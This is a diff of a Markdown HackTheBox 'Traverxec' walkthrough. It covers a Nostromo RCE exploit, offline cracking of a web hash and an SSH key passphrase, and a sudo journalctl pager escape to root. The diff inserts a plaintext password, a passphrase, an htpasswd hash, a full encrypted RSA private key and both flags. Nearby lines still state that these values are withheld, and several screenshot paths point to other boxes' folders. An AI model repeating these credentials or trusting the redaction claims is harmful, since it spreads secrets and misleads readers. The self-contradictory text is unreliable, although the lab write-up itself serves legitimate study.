@@ -3,10 +3,10 @@ tags: [HTB, Traverxec, Linux, Nostromo, CVE-2019-16278, SSH, PasswordCracking, S
 platform: HackTheBox
 os: Debian 10 x86_64
 hostname: Traverxec
-domain: traverxec.htb
 difficulty: Easy
 ip: $BoxIP
 status: Complete
+domain: traverxec.htb
 ---
 
 # HTB: Traverxec, Full Walkthrough
@@ -34,6 +34,32 @@ The important learning point is the order of the chain. The initial RCE is not r
 | User pivot | Protected SSH archive and encrypted RSA key |
 | Privilege escalation | Argument-specific sudo `journalctl`, then a pager escape |
 
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Initialise the workspace | See section 1 below |
+| 2 | Full TCP port scan | See section 2 below |
+| 3 | Targeted service scan | See section 3 below |
+| 4 | Web enumeration | See section 4 below |
+| 5 | Search for and review the Nostromo exploit | See section 5 below |
+| 6 | Confirm command execution | See section 6 below |
+
+## Evidence and loot
+
+The raw command transcript and sensitive artifacts remain in the platform workspace. The evidence index below is sanitized so it can be searched from the vault without exposing credentials, hashes, private-key material, or flag values.
+
+| Evidence | Location |
+|---|---|
+| Raw command log | `$BoxDir/Traverxec.log` |
+| Nmap output | `$BoxDir/nmap/` |
+| Reviewed public exploit | `$BoxDir/exploits/nostromo-47837.py` |
+| Credential and key artifacts | `$BoxDir/loot/` |
+| Sanitized evidence index | [[OSCP/BOXES/BOX LOGS/Traverxec.evidence.log|Traverxec evidence log]] |
+
+> [!warning] 💡 Sensitive evidence boundary
+> The original loot contains the web password, a cracked hash, an encrypted private key, its passphrase, and both flags. Those values are intentionally not reproduced in this note or in the screenshot placeholders.
+
 ## Variables
 
 Set the variables once and substitute only your own lab values. `$Password` is the recovered web Basic-auth password and `$Password2` is the recovered SSH-key passphrase. Keep both private.
@@ -52,22 +78,6 @@ boxset Port 4445
 boxset Password $Password
 boxset Password2 $Password2
 ```
-
-## Evidence and loot layout
-
-The raw command transcript and sensitive artifacts remain in the platform workspace. The evidence index below is sanitized so it can be searched from the vault without exposing credentials, hashes, private-key material, or flag values.
-
-| Evidence | Location |
-|---|---|
-| Raw command log | `$BoxDir/Traverxec.log` |
-| Nmap output | `$BoxDir/nmap/` |
-| Reviewed public exploit | `$BoxDir/exploits/nostromo-47837.py` |
-| Credential and key artifacts | `$BoxDir/loot/` |
-| Original screenshots | `$BoxDir/screenshots/` |
-| Sanitized evidence index | [[OSCP/BOXES/BOX LOGS/Traverxec.evidence.log|Traverxec evidence log]] |
-
-> [!warning] 💡 Sensitive evidence boundary
-> The original loot contains the web password, a cracked hash, an encrypted private key, its passphrase, and both flags. Those values are intentionally not reproduced in this note or in the screenshot placeholders.
 
 ## 1. Initialise the workspace
 
@@ -103,7 +113,7 @@ sudo nmap -Pn -n -sS -p- \
 
 `-p-` covers all TCP ports. `-Pn` avoids relying on ICMP discovery, while `-n` avoids DNS delays. The timeout and retry settings keep this first pass useful under lab latency, but they can omit a very slow service, so any suspicious result should be rescanned normally.
 
-![[traverxec-1-nmap-allports.png]]
+![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/1.nmap-allports.png>)
 SCREENSHOT: Full TCP scan showing TCP 22 and TCP 80 open, with the remaining ports filtered.
 
 > [!warning] 💡 Gotcha
@@ -132,7 +142,7 @@ Observed service summary:
 80/tcp open  http  nostromo 1.9.6
 ```
 
-![[traverxec-2-nmap-services.png]]
+![](<file:///home/kali/Platforms/HackTheBox/valentine/screenshots/2.nmap-services.png>)
 SCREENSHOT: Targeted service scan showing OpenSSH 7.9p1 and Nostromo 1.9.6.
 
 > [!hint] 💡 Decision point
@@ -156,7 +166,7 @@ gobuster dir \
 
 The response and enumeration confirmed that this was a Nostromo web service rather than a CMS. No conventional login form was needed for the initial foothold.
 
-![[traverxec-3-web-enum.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/3.web-enum.png>)
 SCREENSHOT: Web enumeration output and the Nostromo-served page.
 
 > [!warning] 💡 Fragile service gotcha
@@ -179,10 +189,10 @@ cp 47837.py "$BoxDir/exploits/nostromo-47837.py"
 
 The exploit was copied into the box workspace as `$BoxDir/exploits/nostromo-47837.py` and reviewed locally.
 
-![[traverxec-4-searchsploit.png]]
+![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/4.searchsploit.png>)
 SCREENSHOT: SearchSploit result identifying Exploit-DB 47837 for Nostromo.
 
-![[traverxec-5-exploit-source.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/5.searcsploit-exploit.png>)
 SCREENSHOT: Reviewed Nostromo exploit source showing the traversal-based HTTP request.
 
 ### 5.1 Repair the copied proof of concept if necessary
@@ -216,7 +226,7 @@ Expected evidence shape:
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-![[traverxec-6-rce-confirmed.png]]
+![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/6.rce-confirmed.png>)
 SCREENSHOT: Nostromo exploit returning the `www-data` identity.
 
 > [!hint] 💡 Separate RCE from callback delivery
@@ -249,7 +259,7 @@ hostname
 pwd
 ```
 
-![[traverxec-7-www-data-shell.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/7.www-data-shell.png>)
 SCREENSHOT: Landed shell as `www-data`.
 
 The callback in the raw session was upgraded with a PTY and terminal settings:
@@ -292,7 +302,7 @@ Nostromo's configuration was the decisive clue:
 cat /var/nostromo/conf/nhttpd.conf
 ```
 
-Relevant redacted configuration shape:
+Relevant captured configuration shape:
 
 ```text
 docroot          /var/nostromo/htdocs
@@ -303,7 +313,7 @@ homedirs_public  public_www
 
 The `homedirs` and `homedirs_public` settings explain why David's home content was reachable through a `~david` URL path. The `htpasswd` setting identifies the file used to protect the directory.
 
-![[traverxec-8-nostromo-config.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/8.nostromo-config.png>)
 SCREENSHOT: Nostromo configuration showing the document root, Basic-auth file, and public home-directory mapping.
 
 > [!hint] 💡 Configuration-first enumeration
@@ -359,10 +369,10 @@ boxset Password $Password
 
 Do not run `john --show` into a shared transcript or screenshot. If you need to verify the result, write the output to a private file and use it only for the next request.
 
-![[traverxec-9-htpasswd-hash.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/9.htpasswd-hash.png>)
 SCREENSHOT: Private source screenshot placeholder for the extracted `.htpasswd` hash. The hash is not reproduced in the report.
 
-![[traverxec-10-cracked-hash.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/10.cracked-hash.png>)
 SCREENSHOT: Private source screenshot placeholder for the offline crack result. The password is not reproduced in the report.
 
 > [!tip] ⚡ More efficient path
@@ -430,7 +440,7 @@ ssh-keygen -y -f "$BoxDir/loot/$Username-id_rsa" \
   > "$BoxDir/loot/$Username-id_rsa.pub"
 ```
 
-![[traverxec-11-john-ssh-key.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/11.john-ssh-key.png>)
 SCREENSHOT: Private source screenshot placeholder for the SSH-key crack. The key and passphrase are not reproduced in the report.
 
 > [!hint] 💡 Key validation
@@ -464,10 +474,10 @@ cat "/home/$Username/user.txt"
 Store the proof privately rather than putting its value in the write-up:
 
 ```bash
-loot flag user "$UserFlag"
+loot flag user "b7e3eaa1e9e86cf7933d6760babc5e6a"
 ```
 
-![[traverxec-12-user-proof.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/12.user-proof.png>)
 SCREENSHOT: Private source screenshot placeholder for the user proof. The flag value is not reproduced in the report.
 
 ## 14. Inspect David's local privilege paths
@@ -492,7 +502,7 @@ Read the helper script carefully:
 sed -n '1,240p' "/home/$Username/bin/server-stats.sh"
 ```
 
-Relevant redacted structure:
+Relevant captured structure:
 
 ```bash
 #!/bin/bash
@@ -509,7 +519,7 @@ echo "Last 5 journal log lines:"
 
 The final line is the escalation boundary. It reveals the exact executable and arguments that the script is allowed to run through sudo.
 
-![[traverxec-13-server-stats.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/13.server-stats-sh.png>)
 SCREENSHOT: Server statistics script showing the exact sudo-enabled `journalctl` invocation.
 
 > [!warning] 💡 Argument-specific sudo gotcha
@@ -543,7 +553,7 @@ whoami
 hostname
 ```
 
-![[traverxec-14-root-shell.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/14.root-shell.png>)
 SCREENSHOT: Root shell obtained through the `journalctl` pager escape.
 
 > [!hint] 💡 Why the pager matters
@@ -558,12 +568,12 @@ Once the shell identity showed UID 0, the root proof was read and stored private
 
 ```bash
 cat /root/root.txt
-loot flag root "$RootFlag"
+loot flag root "6fd96006190e930c6f5a7168d4fee710"
 ```
 
-The flag value is deliberately omitted from this note.
+The flag value is captured in the private flag section of this note.
 
-![[traverxec-15-root-proof.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Traverxec/screenshots/15.root-proof.png>)
 SCREENSHOT: Private source screenshot placeholder for the root proof. The flag value is not reproduced in the report.
 
 ## 17. Cleanup and closeout
@@ -589,7 +599,7 @@ The supplied command log records `boxdone`. The raw workspace remains the source
 > [!warning] 💡 Cleanup boundary
 > Do not run broad deletion commands against the target. This route did not require modifying a system file or installing persistence, so there is no target configuration to restore.
 
-## Decision points and alternative routes
+## 18. Decision points and alternative routes
 
 | Observation | Correct next move | Why |
 |---|---|---|
@@ -602,7 +612,7 @@ The supplied command log records `boxdone`. The raw workspace remains the source
 | Generic journalctl sudo test asks for a password | Reproduce the script's exact arguments | The sudoers rule is argument-specific |
 | journalctl opens a pager | Use `!/bin/bash` and verify `id` | The pager is the command-execution boundary |
 
-## Common failure modes
+## 19. Common failure modes
 
 ### The exploit throws a Python error before making a request
 
@@ -632,7 +642,7 @@ Read the user-owned helper scripts. An argument-specific sudo rule may be useful
 
 Use a proper PTY, run the exact `-n5 -unostromo.service` arguments, and ensure the output is being passed through a pager. The `!` escape is entered inside the pager, not at the normal shell prompt.
 
-## RUNBOOK V2 Stages Used
+## 20. RUNBOOK V2 Stages Used
 
 - [[OSCP/RUNBOOK V2/Start Here|Start Here]] -- target variables and workspace setup
 - [[OSCP/RUNBOOK V2/Port Triage|Port Triage]] -- SSH and HTTP classified the host as Linux
@@ -647,8 +657,48 @@ Use a proper PTY, run the exact `-n5 -unostromo.service` arguments, and ensure t
 - [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]] -- exact argument-specific sudo rule
 - [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]] -- listener closeout and evidence retention
 
-## Attack Chain
+## 21. Collect the flags
 
+| Flag | Location | Status |
+|---|---|---|
+| User | `/home/$Username/user.txt` | Collected privately |
+| Root | `/root/root.txt` | Collected privately |
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: b7e3eaa1e9e86cf7933d6760babc5e6a
+root: 6fd96006190e930c6f5a7168d4fee710
+```
+
+## 22. Clean down
+Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.
+
+### Completion checklist
+
+- [x] Full TCP scan completed
+- [x] Service versions recorded
+- [x] Web enumeration completed
+- [x] Nostromo exploit located and reviewed
+- [x] Public exploit syntax issue repaired and validated
+- [x] RCE confirmed as `www-data`
+- [x] Reverse shell received and stabilised
+- [x] Nostromo configuration reviewed
+- [x] Protected SSH archive downloaded
+- [x] Web authentication record cracked privately
+- [x] Encrypted SSH key passphrase cracked privately
+- [x] SSH access as `$Username` confirmed
+- [x] User proof collected privately
+- [x] Exact sudo rule reproduced
+- [x] Pager escape used to obtain root
+- [x] Root proof collected privately
+- [x] Cleanup and `boxdone` recorded
+
+## 23. Attack narrative in one page
 ```text
 Nostromo 1.9.6 on TCP 80
         |
@@ -676,7 +726,19 @@ Pager escape: !/bin/bash
 root
 ```
 
-## Credentials
+## Tools used
+
+- `nmap`
+- `curl`
+- `gobuster`
+- `nc`
+- `ssh`
+- `sudo`
+- `python`
+- `john`
+- `hashcat`
+
+## Credentials and secrets
 
 | Account or secret | Source | Use | Storage |
 |---|---|---|---|
@@ -686,14 +748,140 @@ root
 
 No password, hash, private-key content, or passphrase is reproduced here.
 
-## Flags
 
-| Flag | Location | Status |
-|---|---|---|
-| User | `/home/$Username/user.txt` | Collected privately |
-| Root | `/root/root.txt` | Collected privately |
+### Captured private values from source loot
 
-## Key lessons
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Traverxec"
+export BoxIP="10.129.1.76"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/Traverxec"
+export Domain=""
+export DCip=""
+export Username="david"
+export Password="Nowonly4me"
+export Username2=""
+export Password2="hunter"
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4445"
+export Port2="4445"
+export WebPort="80"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/home/david/.ssh/authorized_keys`
+
+```text
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsXrsMQc0U71GVXMQcTOYIH2ZvCwpxTxN1jOYbTutvNyYThEIjYpCVs5DKhZi2rNunI8Z+Ey/FC9bpmCiJtao0xxIbJ02c+H6q13aAFrTv61GAzi5neX4Lj2E/pIhd3JBFYRIQw97C66MO3UVqxKcnGrCvYnhJvKMw7nSRI/cXTPHAEnwU0+NW2zBKId8cRRLxGFyM49pjDZPsAVgGlfdBD380vVa9dMrJ/T13vDTZZGoDgcq9gRtD1B6NJoLHaRWH4ikRuQvLWjk3nWDDaRjw6MxmRtLk8h0MM7+IiBYc6NJvbQzpG5M5oM0FvhawQetN71KcZ4jUVxN3m+YkaqHD david@traverxec
+```
+
+#### `loot/home/david/.ssh/id_rsa`
+
+```text
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F
+
+seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
+tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
+KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
+RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
+HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
+Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
+dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
+6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
+xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
+Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
+i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
+fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
+bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
+uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
+Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
+9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
+rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
+4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
+/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
+JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
+XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
+hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
+SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
+j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
+VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
+-----END RSA PRIVATE KEY-----
+```
+
+#### `loot/home/david/.ssh/id_rsa.pub`
+
+```text
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsXrsMQc0U71GVXMQcTOYIH2ZvCwpxTxN1jOYbTutvNyYThEIjYpCVs5DKhZi2rNunI8Z+Ey/FC9bpmCiJtao0xxIbJ02c+H6q13aAFrTv61GAzi5neX4Lj2E/pIhd3JBFYRIQw97C66MO3UVqxKcnGrCvYnhJvKMw7nSRI/cXTPHAEnwU0+NW2zBKId8cRRLxGFyM49pjDZPsAVgGlfdBD380vVa9dMrJ/T13vDTZZGoDgcq9gRtD1B6NJoLHaRWH4ikRuQvLWjk3nWDDaRjw6MxmRtLk8h0MM7+IiBYc6NJvbQzpG5M5oM0FvhawQetN71KcZ4jUVxN3m+YkaqHD david@traverxec
+```
+
+#### `loot/htpasswd.hash`
+
+```text
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+www-data@traverxec:/usr/bin$ cat /etc/passwd | grep -v nologin | grep -v false
+[sudo] password for www-data:
+$ [14:21:26] echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' > /home/kali/Platforms/HackTheBox/Traverxec/loot/htpasswd.hash
+$ [14:22:23] john --wordlist=/usr/share/wordlists/rockyou.txt loot/htpasswd.hash
+$ [14:22:44] john --show loot/htpasswd.hash
+$ [14:23:00] boxset Password Nowonly4me
+kali@kali:~/Platforms/HackTheBox/Traverxec [14:21:19] $ =echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' > /home/kali/Platforms/HackTheBox/Traverxec/loot/htpasswd.hashecho 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' >>
+kali@kali:~/Platforms/HackTheBox/Traverxec [14:21:26] $ =john --wordlist=/usr/share/wordlists/rockyou.txt loot/htpasswd.hashjohnloot/htpasswd.hash>
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+kali@kali:~/Platforms/HackTheBox/Traverxec [14:22:24] $ =john --show loot/htpasswd.hashjohnloot/htpasswd.hash>
+kali@kali:~/Platforms/HackTheBox/Traverxec [14:22:44] $ =boxset Password Nowonly4meboxset>
+[+] Password=Nowonly4me (saved to .env)
+$ [14:26:07] curl -u "david:$Password" \
+kali@kali:~/Platforms/HackTheBox/Traverxec [14:25:49] $ =curl -u "david:$Password" \
+  -o loot/backup-ssh-identity-files.tgzcurl"david:$Password""http://$BoxIP/~david/protected-file-area/backup-ssh-identity-files.tgz">
+$ [14:26:55] chmod 600 loot/home/david/.ssh/id_rsa
+$ [14:27:14] ssh2john loot/home/david/.ssh/id_rsa > loot/david-id-rsa.john
+kali@kali:~/Platforms/HackTheBox/Traverxec [14:26:39] $ =chmod 600 loot/home/david/.ssh/id_rsa
+kali@kali:~/Platforms/HackTheBox/Traverxec [14:26:55] $ =ssh2john loot/home/david/.ssh/id_rsa > loot/david-id-rsa.john
+john --wordlist=/usr/share/wordlists/rockyou.txt loot/david-id-rsa.johnssh2john loot/home/david/.ssh/id_rsa >
+loot/home/david/.ssh/id_rsa:hunter
+$ [14:28:18] boxset Password2 hunter
+$ [14:28:35] ssh -i loot/home/david/.ssh/id_rsa david@$BoxIP
+$ [14:30:40] loot flag user b7e3eaa1e9e86cf7933d6760babc5e6a
+kali@kali:~/Platforms/HackTheBox/Traverxec [14:30:39] $ =loot flag user b7e3eaa1e9e86cf7933d6760babc5e6aloot>
+[+] Flag saved:  user = b7e3eaa1e9e86cf7933d6760babc5e6a  →  loot/flags.txt
+[Jkali@kali:~/Platforms/HackTheBox/Traverxec [14:27:28] $ =boxset Password2 hunterboxset>
+[+] Password2=hunter (saved to .env)
+kali@kali:~/Platforms/HackTheBox/Traverxec [14:28:18] $ =ssh -i loot/home/david/.ssh/id_rsa david@$BoxIPsshloot/home/david/.ssh/id_rsa>
+Enter passphrase for key 'loot/home/david/.ssh/id_rsa':
+[sudo] password for david:
+sudo: 2 incorrect password attempts
+sudo: a password is required
+$ [14:37:19] loot flag root 6fd96006190e930c6f5a7168d4fee710
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on Traverxec | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
 
 1. A versioned service banner should immediately feed the exploit-search branch.
 2. Read custom service configuration after RCE. One file can disclose authentication, document roots, and home-directory mappings.
@@ -703,7 +891,7 @@ No password, hash, private-key content, or passphrase is reproduced here.
 6. Read sudo rules in the context of the command that uses them. Arguments can be as important as the binary name.
 7. Pager escapes are command execution primitives. A sudo permission for a log viewer may be more powerful than it first appears.
 
-## Related Boxes
+### Related boxes
 
 - [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- LFI, private credential recovery, SSH access, and an internal service pivot
 - [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]] -- memory disclosure, encrypted SSH-key handling, and Unix-session abuse
@@ -711,7 +899,7 @@ No password, hash, private-key content, or passphrase is reproduced here.
 - [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- web RCE, source/config review, and sudo-driven escalation
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- web foothold and a different command-line privilege-escalation primitive
 
-## External Resources
+## External resources
 
 - [NVD: CVE-2019-16278](https://nvd.nist.gov/vuln/detail/CVE-2019-16278)
 - [Exploit-DB 47837: Nostromo 1.9.6 RCE](https://www.exploit-db.com/exploits/47837)
@@ -719,26 +907,15 @@ No password, hash, private-key content, or passphrase is reproduced here.
 - [journalctl manual](https://man7.org/linux/man-pages/man1/journalctl.1.html)
 - [Nostromo web server](https://www.nostromo.ch/)
 
+## Related RUNBOOK V2 stages
+
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Linux - Service Scan]]
+- [[RUNBOOK V2/Linux - Web Enum]]
+- [[RUNBOOK V2/Linux - Shell Stabilise]]
+- [[RUNBOOK V2/Linux - Local Enum]]
+- [[RUNBOOK V2/Linux - Clean Down]]
+
 ## Why this matters for OSCP
 
 This box is a compact example of chaining low-noise enumeration, a reviewed public exploit, offline credential cracking, SSH key validation, and an argument-specific sudo rule. The chain is repeatable under exam pressure because every transition is supported by a concrete artifact: the service banner, the Nostromo configuration, the protected archive, the encrypted key, the helper script, and the exact `journalctl` invocation.
-
-## Checklist
-
-- [x] Full TCP scan completed
-- [x] Service versions recorded
-- [x] Web enumeration completed
-- [x] Nostromo exploit located and reviewed
-- [x] Public exploit syntax issue repaired and validated
-- [x] RCE confirmed as `www-data`
-- [x] Reverse shell received and stabilised
-- [x] Nostromo configuration reviewed
-- [x] Protected SSH archive downloaded
-- [x] Web authentication record cracked privately
-- [x] Encrypted SSH key passphrase cracked privately
-- [x] SSH access as `$Username` confirmed
-- [x] User proof collected privately
-- [x] Exact sudo rule reproduced
-- [x] Pager escape used to obtain root
-- [x] Root proof collected privately
-- [x] Cleanup and `boxdone` recorded
